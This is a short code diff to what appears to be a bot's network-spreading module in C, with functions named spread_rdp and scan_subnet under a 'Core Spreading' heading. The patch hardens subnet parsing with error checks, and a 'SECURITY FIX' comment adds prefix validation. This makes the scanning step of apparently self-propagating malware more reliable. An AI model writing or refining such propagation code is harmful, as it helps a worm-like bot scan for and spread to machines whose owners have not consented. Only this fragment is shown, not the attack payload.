@@ -511,9 +511,11 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
 /* ── Core Spreading ─────────────────────────────────────── */
 int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
     /* Parse subnet: 192.168.1.0/24 */
-    char net[16], mask[4];
-    sscanf(subnet, "%15[^/]/%3s", net, mask);
-    
+    char net[16], mask[4] = {0};
+    if (sscanf(subnet, "%15[^/]/%3s", net, mask) < 2) {
+        log_error("scan_subnet: invalid subnet format '%s' (expected a.b.c.d/nn)", subnet);
+        return -1;
+    }
     int prefix = atoi(mask);
     /* SECURITY FIX (#4): Validate prefix range to prevent integer overflow
      * in (1 << (32 - prefix)). Also reject prefixes smaller than /16 to
